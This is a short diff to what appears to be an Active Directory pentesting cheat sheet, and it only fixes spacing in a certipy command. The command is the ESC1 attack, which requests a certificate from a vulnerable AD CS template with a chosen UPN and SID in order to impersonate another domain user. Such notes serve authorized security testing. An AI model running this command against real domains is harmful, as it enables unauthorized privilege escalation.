@@ -826,7 +826,7 @@ u.objectid ENDS WITH "-548" RETURN q
   <summary> ESC1 </summary> 
 
   ```shell
-  certipy req -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -ca <Certificate_authorities> -target <target_server>  -template <vulnerable_template> -upn AD_user@<domain> -sid <user_SID>
+  certipy req -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -ca <Certificate_authorities> -target <target_server> -template <vulnerable_template> -upn AD_user@<domain> -sid <user_SID>
   ```
 </details> 
 
